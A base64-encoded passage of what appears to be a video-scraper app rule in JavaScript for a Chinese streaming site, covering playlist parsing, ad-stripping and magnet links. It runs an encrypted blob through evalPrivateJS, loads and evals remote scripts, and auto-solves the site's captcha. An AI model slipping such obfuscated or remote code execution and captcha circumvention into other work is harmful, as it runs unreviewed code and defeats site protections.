gICBpZihsaXN0Lmxlbmd0aCA+IDApe1xcbiAgICAgICAgdmFyIHBsaXN0ID0gc3RvcmFnZTAuZ2V0TXlWYXIoJ2VyX3BsYXlsaXN0cycsICd7fScpO1xcbiAgICAgICAgaWYoIXBsaXN0Lmhhc093blByb3BlcnR5KHNoc29ydCkpe1xcbiAgICAgICAgICAgICBwbGlzdFtzaHNvcnRdPXt9O1xcbiAgICAgICAgfVxcbiAgICAgICAgcGxpc3Rbc2hzb3J0XVsnY2xzJ109c2hzb3J0O1xcbiAgICAgICAgcGxpc3Rbc2hzb3J0XVsnY29sX3R5cGUnXT3moLflvI87XFxuICAgICAgICBwbGlzdFtzaHNvcnRdWydwaWMnXT3lm77moIc7XFxuICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcignZXJfcGxheWxpc3RzJywgcGxpc3QpO1xcbiAgICAgICAgfSAgIFxcbiAgICAgICAgXFxuICAgICAgICBcXG4gICAgICAgIGZvciAodmFyIGogaW4gbGlzdCkge1xcbiAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICAgIHRpdGxlOiBsaXN0W2pdLnRpdGxlLFxcbiAgICAgICAgICAgICAgICB1cmw6IGxpc3Rbal0udXJsLFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTog5qC35byPLFxcbiAgICAgICAgICAgICAgICBwaWM65Zu+5qCHLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGxpc3Rbal0udXJsLnJlcGxhY2UoL0BsYXp5UnVsZVtcXFxcc1xcXFxTXSsvZywgJycpLFxcbiAgICAgICAgICAgICAgICAgICAgY2xzOiBzaHNvcnQsXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH1cXG4gICAgfSxcXG4gICAgZ2V0VGFiczogZnVuY3Rpb24ocGFyc2UpIHtcXG4gICAgICAgIHZhciB0YWJzID0gW107XFxuICAgICAgICB2YXIgYXJ0cyA9IHBkZmEoaHRtbCwgcGFyc2Uu57q/6LevKTtcXG4gICAgICAgIHZhciDnur/ot6/lkI0gPSBwYXJzZS7nur/ot6/lkI3np7A7XFxuICAgICAgICB2YXIg5pu/5o2i5Ye95pWwID0gJyc7XFxuICAgICAgICBpZiAocGFyc2Uu57q/6Lev5ZCN56ewLmluY2x1ZGVzKCdAQCcpKSB7XFxuICAgICAgICAgICAg57q/6Lev5ZCNID0gcGFyc2Uu57q/6Lev5ZCN56ewLnNwbGl0KCdAQCcpWzBdO1xcbiAgICAgICAgICAgIOabv+aNouWHveaVsCA9IHBhcnNlLue6v+i3r+WQjeensC5zcGxpdCgnQEAnKVsxXTtcXG4gICAgICAgIH1cXG4gICAgICAgIGZvciAodmFyIGkgaW4gYXJ0cykge1xcbiAgICAgICAgICAgIHZhciBsaW5lbmFtZSA9IHBkZmgoYXJ0c1tpXSwg57q/6Lev5ZCNKTtcXG4gICAgICAgICAgICBpZiAo5pu/5o2i5Ye95pWwICE9ICcnKSB7XFxuICAgICAgICAgICAgICAgIGxpbmVuYW1lID0gZXZhbCgnbGluZW5hbWUnICsg5pu/5o2i5Ye95pWwKTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgdGFicy5wdXNoKGxpbmVuYW1lKTtcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiB0YWJzO1xcbiAgICB9LFxcbiAgICBnZXRMaXN0czogZnVuY3Rpb24ocGFyc2Usc2hzb3J0KSB7XFxuICAgICAgICBzaHNvcnQgPSBzaHNvcnQgPyBzaHNvcnQgOiAnc2hzb3J0JztcXG4gICAgICAgIHZhciBsaXN0cyA9IFtdO1xcbiAgICAgICAgdmFyIGNvbnRzID0gcGRmYShodG1sLCBwYXJzZS7pgInpm4YpO1xcbiAgICAgICAgdmFyIOmAiembhuWQjeensCA9IHBhcnNlLumAiembhuWQjeensCA/IHBhcnNlLumAiembhuWQjeensCA6ICdhJiZUZXh0JztcXG4gICAgICAgIHZhciDpgInpm4bpk77mjqUgPSBwYXJzZS7pgInpm4bpk77mjqUgPyBwYXJzZS7pgInpm4bpk77mjqUgOiAnYSYmaHJlZic7XFxuICAgICAgICB2YXIg6Kej5p6QID0gcGFyc2Uu6Kej5p6QID8gcGFyc2Uu6Kej5p6QIDogJyc7XFxuICAgICAgICB2YXIgdGVtcCA9IFtdO1xcbiAgICAgICAgZm9yICh2YXIgaSBpbiBjb250cykge1xcbiAgICAgICAgICAgIGlmIChwYXJzZS7pgInpm4bliJfooaggIT0gdW5kZWZpbmVkKSB7XFxuICAgICAgICAgICAgICAgIGxpc3RzLnB1c2gocGRmYShjb250c1tpXSwgcGFyc2Uu6YCJ6ZuG5YiX6KGoKS5tYXAoeCA9PiB7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBwZGZoKHgsIOmAiembhuWQjeensCksXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBwZCh4LCDpgInpm4bpk77mjqUpICsg6Kej5p6QLFxcbiAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB9KSlcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICB2YXIgdXJsID0gcGQoY29udHNbaV0sIOmAiembhumTvuaOpSk7XFxuICAgICAgICAgICAgICAgIGlmICgh6YCJ6ZuG6ZO+5o6lLmluY2x1ZGVzKCdocmVmJykpIHtcXG4gICAgICAgICAgICAgICAgICAgIHVybCA9IHBkZmgoY29udHNbaV0sIOmAiembhumTvuaOpSk7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgdGVtcC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBwZGZoKGNvbnRzW2ldLCDpgInpm4blkI3np7ApLFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiB1cmwgKyDop6PmnpAsXFxuICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfVxcbiAgICAgICAgbGV0IOWAkuW6jyA9IHBhcnNlLuWAkuW6jyA/IHBhcnNlLuWAkuW6jyA6IGZhbHNlO1xcbiAgICAgICAgdmFyIHJlc3VsdHMgPSBsaXN0cy5sZW5ndGggPyBsaXN0cyA6IFt0ZW1wXTtcXG4gICAgICAgIGlmICjlgJLluo8pIHtcXG4gICAgICAgICAgICByZXN1bHRzID0gcmVzdWx0cy5tYXAoeCA9PiB4LnJldmVyc2UoKSk7XFxuICAgICAgICB9XFxuICAgICAgICB2YXIgcGxpc3QgPSBzdG9yYWdlMC5nZXRNeVZhcignZXJfcGxheWxpc3RzJywgJ3t9Jyk7XFxuICAgICAgICBpZiAocmVzdWx0cy5zb21lKHggPT4geC5sZW5ndGggPiAwKSkge1xcbiAgICAgICAgICAgaWYoIXBsaXN0Lmhhc093blByb3BlcnR5KHNoc29ydCkpe1xcbiAgICAgICAgICAgICBwbGlzdFtzaHNvcnRdPXt9O1xcbiAgICAgICAgICAgfVxcbiAgICAgICAgICAgcGxpc3Rbc2hzb3J0XVsnbGVuZ3RoJ109cmVzdWx0cy5sZW5ndGg7XFxuICAgICAgICB9O1xcbiAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoJ2VyX3BsYXlsaXN0cycsIHBsaXN0KTtcXG4gICAgICAgIHJldHVybiByZXN1bHRzO1xcbiAgICB9LFxcbiAgICBnZXRQbGF5ZXJzOiBmdW5jdGlvbihwYXJzZSwgbW9kZSxmdW5jKSB7XFxuICAgICAgICAvL2xvZyhtb2RlKVxcbiAgICAgICAgdmFyIHBsYXkgPSAnZXJfcGxheWxpc3RfJztcXG4gICAgICAgIHRoaXMucHJlTG9hZChmdW5jKTtcXG4gICAgICAgIHRoaXMuY2xvc2UocGFyc2UubWFwKHggPT4geC7nsbvlnospLCBwYXJzZS5sZW5ndGgpO1xcbiAgICAgICAgbW9kZSA9IG1vZGUgPyBtb2RlIDogMTtcXG4gICAgICAgIFxcbiAgICAgICAgdmFyIHBlPXBhcnNlLm1hcCh4PT5wZGZhKGh0bWwseC7nur/ot68pLmxlbmd0aCkuZmlsdGVyKHk9Pnk+MCk7XFxuICAgICAgICBcXG4gICAgICAgIFxcbiAgICAgICAgcGFyc2UuZm9yRWFjaCgoaXRlbSwgaSkgPT4ge1xcbiAgICAgICAgICAgIHZhciB0YWJzID0gWyfkuLvnur8nXTtcXG4gICAgICAgICAgICBpZiAoaXRlbS7nur/ot68gIT0gdW5kZWZpbmVkKSB7XFxuICAgICAgICAgICAgICAgIHRhYnMgPSB0aGlzLmdldFRhYnMoaXRlbSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHB1dE15VmFyKHBsYXkraSsnX3RhYnMnLHRhYnMpO1xcbiAgICAgICAgICAgIGlmKGl0ZW0uQWpheCl7XFxuICAgICAgICAgICAgICAgIGlmIChtb2RlID09IDEpIHtcXG4gICAgICAgICAgICAgICAgICAgIHRoaXMuc2V0VGFicyh0YWJzLCBpdGVtLuexu+WeiywgcGxheSArIGksaXRlbSk7XFxuICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5zZXRUYWJzMih0YWJzLCBpdGVtLuexu+WeiywgcGxheSArIGksaXRlbSxwZSk7XFxuICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICBwdXRNeVZhcignZXJfaHRtbCcsaHRtbCk7XFxuICAgICAgICAgICAgICAgICBwdXRNeVZhcignZXJfdXJsJyxNWV9VUkwpO1xcblxcbiAgICAgICAgICAgICAgICB2YXIgbGlzdHM9ZnVuYyhnZXRNeVZhcignZXJfJytpdGVtLuexu+WeiywnMCcpLE1ZX1VSTCk7XFxuICAgICAgICAgICAgfWVsc2V7XFxuICAgICAgICAgICAgdmFyIGxpc3RzID0gdGhpcy5nZXRMaXN0cyhpdGVtLCBwbGF5K2kpO1xcbiAgICAgICAgICAgIFxcbiAgICAgICAgICAgIFxcbiAgICAgICAgICAgIGlmIChsaXN0cy5zb21lKHggPT4geC5sZW5ndGggPiAwKSkge1xcbiAgICAgICAgICAgICAgICBpZiAobW9kZSA9PSAxKSB7XFxuICAgICAgICAgICAgICAgICAgICB0aGlzLnNldFRhYnModGFicywgaXRlbS7nsbvlnossIHBsYXkgKyBpLGl0ZW0pO1xcbiAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICAgIHRoaXMuc2V0VGFiczIodGFicywgaXRlbS7nsbvlnossIHBsYXkgKyBpLGl0ZW0scGUpO1xcbiAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGlmIChnZXRNeVZhcignZXJfJyArIGl0ZW0u57G75Z6LICsgJ2ZvbGQnLCAnMScpID09ICcxJykge1xcbiAgICAgICAgICAgICAgICB0aGlzLnNldExpc3RzKGxpc3RzLCBnZXRNeVZhcignZXJfJytpdGVtLuexu+WeiywgJzAnKSwgcGxheSArIGksaXRlbSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiAnYmxhbmtfYmxvY2snXFxuICAgICAgICAgICAgfSlcXG4gICAgICAgIH0pXFxuICAgIH1cXG59XFxuXFxuXFxubGV0IE1ldGhvZHM9e1xcbiAgICAvL+WkmumAieaooeWdl1xcbiAgICBNdWx0aVNlbGVjdE1vZGU6ZnVuY3Rpb24obmFtZSxpZCxzaHNvcnQpe1xcbiAgICAgICAgcmV0dXJuICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGRhdGF0aXRsZSwgZGF0YXVybCxzaHNvcnQpID0+IHtcXG4gICAgICAgICAgICBmdW5jdGlvbiB1bmlxdWUoYXJyKSB7XFxuICAgICAgICAgICAgY29uc3QgcmVzID0gbmV3IE1hcCgpXFxuICAgICAgICAgICAgcmV0dXJuIGFyci5maWx0ZXIoKGEpID0+ICFyZXMuaGFzKGEudXJsKSAmJiByZXMuc2V0KGEudXJsLCAxKSlcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgbGV0IGR1b3NlbGVjdCA9IHN0b3JhZ2UwLmdldE15VmFyKHNoc29ydCtcXFwiX2R1b3NlbGVjdFxcXCIpID8gc3RvcmFnZTAuZ2V0TXlWYXIoc2hzb3J0K1xcXCJfZHVvc2VsZWN0XFxcIikgOiBbXTtcXG4gICAgICAgICAgICBpZiAoZHVvc2VsZWN0LmZpbmRJbmRleCh4ID0+IHgudXJsID09PSBkYXRhdXJsKSA9PSAtMSkge1xcbiAgICAgICAgICAgICAgICBkdW9zZWxlY3QucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogZGF0YXRpdGxlLFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiBkYXRhdXJsXFxuICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgICAgIGR1b3NlbGVjdCA9IHVuaXF1ZShkdW9zZWxlY3QpXFxuICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oZGF0YXVybCwge1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IGDigJzigJzigJ3igJ08c3BhbiBzdHlsZT1cXFwiY29sb3I6I0ZGNTczM1xcXCI+YCArIGRhdGF0aXRsZSxcXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgZnVuY3Rpb24gcmVtb3ZlQnlWYWx1ZShhcnIsIHZhbCkge1xcbiAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoYXJyW2ldWyd1cmwnXSA9PSB2YWwpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJyLnNwbGljZShpLCAxKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIHJlbW92ZUJ5VmFsdWUoZHVvc2VsZWN0LCBkYXRhdXJsKVxcbiAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKGRhdGF1cmwsIHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBkYXRhdGl0bGVcXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKHNoc29ydCtcXFwiX2R1b3NlbGVjdFxcXCIsIGR1b3NlbGVjdCk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIlxcbiAgICAgICAgfSwgbmFtZSwgaWQsIHNoc29ydClcXG4gICAgfSxcXG59XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLpgJrnlKjop6PmnpDljrvlub/lkYpcIixcInBhdGhcIjpcImxhenlcIixcInJ1bGVcIjpcInZhciBsYXp5ID0gJCgnJykubGF6eVJ1bGUoKCkgPT4ge1xcbmlmIChpbnB1dC5pbmRleE9mKCdtYWduZXQ6P3h0JykgPT0gLTEpIHtcXG4gICAgdHJ5e1xcbiAgICAgIHZhciBodG1sID0gSlNPTi5wYXJzZShyZXF1ZXN0KGlucHV0KS5tYXRjaCgvciBwbGF5ZXJfLio/PSguKj8pPC8pWzFdKVxcbiAgICB2YXIgdXJsID0gaHRtbC51cmxcXG4gICAgaWYgKGh0bWwuZW5jcnlwdCA9PSAnMScpIHtcXG4gICAgICAgIHVybCA9IHVuZXNjYXBlKHVybCk7XFxuICAgIH0gZWxzZSBpZiAoaHRtbC5lbmNyeXB0ID09ICcyJykge1xcbiAgICAgICAgdXJsID0gdW5lc2NhcGUoYmFzZTY0RGVjb2RlKHVybCkpO1xcbiAgICB9XFxuICAgIGlmICgvbTN1OHxtcDR8Zmx2Ly50ZXN0KHVybCkpIHtcXG4gICAgICAgaWYgKC92aXB8aGQvLnRlc3QodXJsKSkge1xcclxcbiAgICAgICAgICAgZXZhbFByaXZhdGVKUygnVHVTSmRwblphcVhHUnZ2T0ZSUiszUzdlWlVqZUMxQ2ZmRmJIaG9vMGU1K2FaN0thdjlLWlZac2Zrd0trVUZmNHd6a1RyaW80akFSSDZad1RYcFJsSDNrSTQzcldDVFU0UGRZYW0xNXBQWWlxNWNXMEg2Z1VYaEpXN3RtSnR5TEtkamUxS2FwQklHdldhWEkwV21vSG9NRUZCVi9NQWljbVBncHlBSlpqc2M1RW12ZGgxbjcyV1BQaXloWU5Db01uWjlKcFA2YUVzV1FFbVFNY0FqUHhnczZVTXZzTy9QT3c1Q2NyNzlzSnppY3N0L0xsM0lPajVNK1B2cUtyVGQ2MTQ3VkdQRXp0anNVZUV1ZEFTelRjbis5NUM5VmcxdXdVdmQ5ejB3NXFzUGJvUWg1b1poVHlzNFJRRXpCR0lxdWxRTUFBUVk0SUZrYW5XWDk1RUlOWkRYNTBtQWlPU0d5SWQwNkhzcHJBZWwvZmg3d3lNWGRtZXUrUzE1WG5jTzdVdXVqTU9tR2dTQUVOL1NzYzJlemt4bEd2cGR5aGJsNHA0RGFRdWcvbnJnc3doWmo3NS9NNTNzS1lYMnpSZ09TVDdDTWpWLytwUEpkMUtQOTM0dXUvVnNCUVVHNjltV04rS2FGV2hLbndCUGhWOXFkcUd6L0xTSm5GeEl2UThrQngnKVxcbiAgICAgICAgICAgcmV0dXJuIHUgKyBcXFwiP3VybD1cXFwiICsgYmFzZTY0RW5jb2RlKHVybCkgKyBcXFwiIy5tM3U4XFxcIjtcXHJcXG4gICAgICAgIH1cXHJcXG4gICAgICAgIHJldHVybiB1cmxcXG4gICAgfSBlbHNlIHtcXG4gICAgICAgIHJlcXVpcmVDYWNoZSgnaHR0cHM6Ly9hZ2l0LmFpL2x6azIzNTU5L1B1YmxpY1J1bGUvcmF3L2JyYW5jaC9tYXN0ZXIveDVydWxlLmpzJywgMjQpO1xcbiAgICAgICAgcmV0dXJuIHg1cnVsZShpbnB1dCwgaW5wdXQpO1xcbiAgfVxcbn1jYXRjaChlKXtcXG4vL3JlcXVpcmVDYWNoZSgnaHR0cHM6Ly9hZ2l0LmFpL2x6azIzNTU5L1B1YmxpY1J1bGUvcmF3L2JyYW5jaC9tYXN0ZXIveDVydWxlLmpzJywgMjQpO1xcbiAgICAgICAgLy9yZXR1cm4geDVydWxlKGlucHV0LCBpbnB1dCk7XFxuICAgICAgICByZXR1cm4gJ3ZpZGVvOi8vJyArIGlucHV0O1xcbn0gICBcXG4gfSBlbHNlIHtcXG4gICAgICAgIHJldHVybiBpbnB1dFxcbiAgICB9XFxufSlcIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIumqjOivgeeggVwiLFwicGF0aFwiOlwieXptXCIsXCJydWxlXCI6XCJ3aGlsZSAoL+i+k+WFpemqjOivgeeggXzns7vnu5/lronlhajpqozor4EvLnRlc3QoaHRtbCkpIHtcXG4gICAgbGV0IGhlYWRlcnMgPSB7XFxuICAgICAgICBcXFwiVXNlci1BZ2VudFxcXCI6IE1PQklMRV9VQSxcXG4gICAgICAgIFxcXCJSZWZlcmVyXFxcIjogTVlfVVJMXFxuICAgIH1cXG4gICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9qeGhzP3J1bGU95qih5p2/wrdRJykpLnJ1bGUpO1xcbiAgICBldmFsUHJpdmF0ZUpTKHNzeXopO1xcblxcbiAgICBsZXQgdmNvZGUgPSBnZXRWQ29kZTIoTVlfSE9NRSArICcvaW5kZXgucGhwL3ZlcmlmeS9pbmRleC5odG1sPycsIEpTT04uc3RyaW5naWZ5KGhlYWRlcnMpLCAnbnVtJyk7XFxuICAgIGZldGNoKE1ZX0hPTUUgKyBodG1sLm1hdGNoKC9cXFxcL2luZGV4LnBocC4qP3ZlcmlmeT0vKVswXSArIEpTT04ucGFyc2UodmNvZGUpLnJldCwge1xcbiAgICAgICAgaGVhZGVyczogaGVhZGVycyxcXG4gICAgICAgIG1ldGhvZDogJ1BPU1QnXFxuICAgIH0pXFxuICAgIHZhciB5eiA9IE1ZX1RZUEUgPT0gJ2hvbWUnID8gdHJ1ZV91cmwgOiBNWV9VUkxcXG4gICAgbG9nKE1ZX1RZUEUpXFxuICAgIGh0bWwgPSByZXF1ZXN0KHl6LCB7XFxuICAgICAgICAvLyAgIGhlYWRlcnM6IGhlYWRlcnNcXG4gICAgfSlcXG59XFxuaWYgKC/popHnuYHmk43kvZwvLnRlc3QoaHRtbCkpIHtcXG4gICAgZC5wdXNoKHtcXG4gICAgdGl0bGU6ICfnvZHnq5nmkJzntKLml7bpl7Tpl7TpmpQnLFxcbiAgICBkZXNjOiBcXFwi5LiL5ouJ6YeN6K+VXFxcIlxcbn0pXFxuXFxufVwifV0sXCJwYXJhbXNcIjpcIntcXFwiaW1nXFxcIjpcXFwiaHR0cHM6Ly9pbWc5LmRvdWJhbmlvLmNvbS92aWV3L3Bob3RvL2xfcmF0aW9fcG9zdGVyL3B1YmxpYy9wMjg5Mjk1Njc3Ni53ZWJwQFJlZmVyZXI9aHR0cHM6Ly9pbWc5LmRvdWJhbmlvLmNvbS9cXFwiLFxcXCJ0aXRsZVxcXCI6XFxcIuWwgeelnuesrOS4gOmDqFxcXCJ9XCIsXCJzYXZlZFwiOmZhbHNlLFwidGl0bGVcIjpcIuWHjOS6keW9seinhlwiLFwidmVyc2lvblwiOjAsXCJ1cmxcIjpcImh0dHBzOi8vd3d3Lmx5eXM4LmNvbS9zdi83bzFFeTlqNzE2Vy5odG1sI2ltbWVyc2l2ZVRoZW1lIztnZXQ7VVRGLTg7e1VzZXItQWdlbnRATW96aWxsYS81LjAgKExpbnV477yb77ybIEFuZHJvaWQgMTHvvJvvvJsgTWkgMTAgUHJvKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvODguMC40MzI0LjE1MiBNb2JpbGUgU2FmYXJpLzUzNy4zNn1cIixcImNvbF90eXBlXCI6XCJtb3ZpZV8xXCIsXCJmaW5kX3J1bGVcIjpcImpzOlxcbnZhciBkID0gW11cXG5NWV9VUkw9TVlfVVJMLnJlcGxhY2UoJ2hpa2VyOi8vZW1wdHkjIycsJycpO1xcbnZhciBodG1sID0gZmV0Y2goTVlfVVJMKTtcXG5cXG4vL3ZhciDmkJzntKLmoIfnrb4gPSAnaDEmJlRleHQnO1xcblxcbmV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvZXInKSkucnVsZSk7XFxuZXZhbChKU09OLnBhcnNlKGZldGNoKCdoaWtlcjovL3BhZ2UvbGF6eScsIHt9KSkucnVsZSk7XFxudmFyIHBsYXlsaXN0ID0gW3tcXG4gICAgLyroh6rlrprkuYk6e1xcbiAgICAgICAg5Zu+5qCHOiAnaHR0cHM6Ly9oaWtlcmZhbnMuY29tL3R1Ymlhby9xLzMucG5nJyxcXG4gICAgICAgIOato+W6j+minOiJsjogJyMzMkNEMzInLFxcbiAgICAgICAg6YCG5bqP6aKc6ImyOiAnI0ZBODA3MicsXFxuICAgICAgICDnur/ot6/pgInkuK06ICcjODdDRUVCJywgICAgICAgXFxuICAgIH0sKi9cXG4gICAg57G75Z6LOiAn5Zyo57q/6KeC55yLJyxcXG4gICAg57q/6LevOiAnYm9keSYmLmhkJiZvcHRpb246bm90KDptYXRjaGVzKOWWnOasoikpJyxcXG4gICAg6YCJ6ZuGOiAnYm9keSYmLnBsYXllcjpub3QoOm1hdGNoZXMozrEpKScsXFxuICAgIOe6v+i3r+WQjeensDogJ1RleHRAQC5yZXBsYWNlKC/OsS8sXFxcIs6yXFxcIiknLFxcbiAgICDpgInpm4bliJfooag6ICdib2R5JiZhOm5vdCg6bWF0Y2hlcyjOsSkpJyxcXG4gICAg5o6S6ZmkOiAnJyxcXG4gICAgLy/pgInpm4blkI3np7A6ICdUZXh0JyxcXG4gICAgLy/pgInpm4bpk77mjqU6ICdhJiZocmVmJyxcXG4gICAgLy/lgJLluo86dHJ1ZSxcXG4gICAg6Kej5p6QOiBsYXp5LFxcbiAgICDmjqjpgIE6IHRydWUsXFxufSwge1xcbiAgICDnsbvlnos6ICfno4HlipvkuIvovb0nLFxcbiAgICAvL+e6v+i3rzogJycsXFxuICAgIOmAiembhjogJ2JvZHkmJi5saXAmJmxpJyxcXG4gICAgLy/nur/ot6/lkI3np7A6ICdUZXh0QEAucmVwbGFjZShcXFwizrJcXFwiLFxcXCJcXFwiKScsXFxuICAgIC8v6YCJ6ZuG5YiX6KGoOiAndWwmJmxpJyxcXG4gICAg6YCJ6ZuG5ZCN56ewOiAnVGV4dCcsXFxuICAgIOmAiembhumTvuaOpTogJ2EmJmhyZWYnLFxcbiAgICDmoLflvI86ICd0ZXh0X2NlbnRlcl8xJyxcXG4gICAg5Zu+5qCHOiAnaHR0cHM6Ly9pbWcudmludWEuY24vaW1hZ2VzL09vejRSLmpwZWcnXFxufV1cXG5cXG52YXIgb2JqID0ge1xcbiAgICBtYWluOiBwZGZhKGh0bWwsICcuY29udGVudC1ydCYmcDpub3QoOm1hdGNoZXMo5Ymn5oOFKSknKSxcXG4gICAgc29ydDogWyfnirbmgIEnLCfnsbvlnosnLCAn5Zyw5Yy6JywgJ+S4iuaYoCcsJ+WvvOa8lCcsICfkuLvmvJQnLCAn5Li75ryUJ10sXFxuICAgIGltZzogTVlfUEFSQU1TLmltZyxcXG4vL3BkKGh0bWwsICcjY292ZXJfc2hvd2JveCYmZGF0YS1vcmlnaW5hbCcpLC8v5bCB6Z2i5Zu+54mHXFxufVxcblxcbkVyamkuc2V0Q29udGVudChvYmopO1xcbkVyamkuc2V0RGVzYyhwZGZoKGh0bWwsICcuc3Fqal9hJiZUZXh0JykucmVwbGFjZSgvKOinhumikeacrOermS4qKS8sJycpLnJlcGxhY2UoL1xcXFxzL2csJycpKTsvL+WJp+aDheeugOS7i1xcbmV2YWwoSlNPTi5wYXJzZShmZXRjaCgnaGlrZXI6Ly9wYWdlL3Rvb2wnLCB7fSkpLnJ1bGUpOy8v5aSW6YOo5b+r5o235pCc57SiXFxuRXJqaS5nZXRQbGF5ZXJzKHBsYXlsaXN0KTtcXG5FcmppLuWjsOaYjigpO1xcblxcbnNldFJlc3VsdChkKVwiLFwiZ3JvdXBcIjpcIuKRoPCfk7rlvbHop4ZcIixcInVhXCI6XCJtb2JpbGVcIixcInByZVJ1bGVcIjpcIlwiLFwicGFnZXNcIjpcIlt7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLkuIDnuqfliIbnsbvliJfooahcXFwiLFxcXCJwYXRoXFxcIjpcXFwieWlcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG4vKlxcXFxu5LiA57qn5bCB6KOFIFxcXFxu5Yqo5oCB5YiG57G7IOWIl+ihqOWIm+W7uiDoh6rliqjkuIvkuIDpobVcXFxcbnZlciAyMDIzMDcxMCAxLjBcXFxcbiovXFxcXG5mdW5jdGlvbiBkeW5hbWljQ2xhc3Mob3B0aW9ucykge1xcXFxuICBjb25zdCBvYmogPSB7XFxcXG4gICAgLy/pu5jorqTlgLxcXFxcbiAgICBsYXlvdXQ6IFxcXFxcXFwidW5kZWZpbmVkXFxcXFxcXCIsXFxcXG4gICAgaHRtbDogXFxcXFxcXCJlbXB0eVxcXFxcXFwiLFxcXFxuICAgIHBhZ2U6IDAsXFxcXG4gICAg5YiG57G76aKc6ImyOiBcXFxcXFxcIiNGQTcyOThcXFxcXFxcIixcXFxcbiAgICDmipjlj6A6IFxcXFxcXFwi4oCc4oCc4oCd4oCdPGI+XFxcXFxcXCIgKyBcXFxcXFxcIuKIqFxcXFxcXFwiLmZvbnRjb2xvcihcXFxcXFxcIiMxYWFkMTlcXFxcXFxcIikgKyBcXFxcXFxcIjwvYj5cXFxcXFxcIixcXFxcbiAgICDlsZXlvIA6IFxcXFxcXFwi4oCc4oCc4oCd4oCdPGI+XFxcXFxcXCIgKyBcXFxcXFxcIuKIp1xcXFxcXFwiLmZvbnRjb2xvcihcXFxcXFxcIiNGRjAwMDBcXFxcXFxcIikgKyBcXFxcXFxcIjwvYj5cXFxcXFxcIixcXFxcbiAgICBvcGVuOiB0cnVlLFxcXFxuICAgIHN0YXRlOiBNWV9SVUxFLnVybCxcXFxcbiAgICBzZWFyY2g6IGZhbHNlLFxcXFxuICAgIGNsZWFyczogW10sXFxcXG4gICAgY2xlYXJhbGw6IFtcXFxcXFxcInlpX2ZpcnN0cGFnZVxcXFxcXFwiXSxcXFxcbiAgICBkZWJ1ZzogZmFsc2UsXFxcXG5cXFxcbiAgICDpooTorr4ocGFyYW0pIHtcXFxcbiAgICAgIGlmKHBhcmFtPT11bmRlZmluZWQpe1xcXFxuICAgICAgICBwYXJhbT1bXTtcXFxcbiAgICAgIH1cXFxcbiAgICAgIE9iamVjdC5rZXlzKHBhcmFtKS5mb3JFYWNoKChwcm9wZXJ0eSkgPT4ge1xcXFxuICAgICAgICAvLyDlr7nmr4/kuKrlsZ7mgKflkI3miafooYzmk43kvZxcXFxcbiAgICAgICAgY29uc3QgdmFsdWUgPSBwYXJhbVtwcm9wZXJ0eV07IC8vIOi